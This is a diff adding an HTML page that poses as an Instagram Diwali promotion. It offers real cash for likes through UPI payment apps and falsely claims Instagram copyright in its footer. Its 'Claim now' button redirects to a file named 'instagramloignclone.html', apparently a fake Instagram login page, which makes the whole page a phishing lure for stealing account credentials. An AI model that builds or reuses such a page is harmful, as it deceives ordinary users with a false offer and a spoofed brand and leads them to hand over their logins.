@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <title>Product Page</title>
+</head>
+<style>
+   body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+}
+
+header {
+   background-image: url("images.jpeg");
+ 
+   
+   background-size:cover;
+   letter-spacing:1px;
+    /* background-color: #333; */
+    color: #fff;
+    text-align: center;
+    padding: 20px;
+}
+
+.product-info {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 20px;
+}
+
+.product-image {
+    flex: 1;
+    padding: 20px;
+    text-align: center;
+}
+
+.product-image img {
+    max-width: 100%;
+}
+
+.product-details {
+    flex: 1;
+    padding: 20px;
+}
+
+button {
+    background-color: #007BFF;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    cursor: pointer;
+
+}
+button:hover:active {
+    background-color: lightgreen;
+    color: black;
+   
+
+}
+
+footer {
+    background-color: #333;
+    color: #fff;
+    text-align: center;
+    padding: 10px;
+}
+#r{
+   color:red;
+   background-color:yellow;
+}
+#g{
+   color:red;
+   background-color:yellow;
+   padding:8px;
+   border-radius:10px;
+}
+
+
+</style>
+<body>
+    <header>
+        <h1>DIWALI OFFERS</h1>
+        <p>Monitize your instagram likes and claim real cash</p>
+    </header>
+    <section class="product-info">
+        <div class="product-image">
+            <img src="bitcoin.jpeg" alt="Product Image">
+        </div>
+        <div class="product-details">
+            <h2> <span id="r"> 100 </span> likes =  <span id="g">10.00     </span>    Indian Rupee</h2>
+            <p>Direct transfer to paytm phonepe gpay and all UPI</p>
+            <p>OFFER ends on 13th nov</p>
+            <button id="buy-button"onclick="myFunction()">Claim now</button>
+        </div>
+    </section>
+    <footer>
+        <p> All Right reserved Instagram.com 2023 </p>
+    </footer>
+   <script>
+   function myFunction() {
+     location.replace("instagramloignclone.html")
+   }
+   </script>
+</body>
+
+</html>
+
+
+
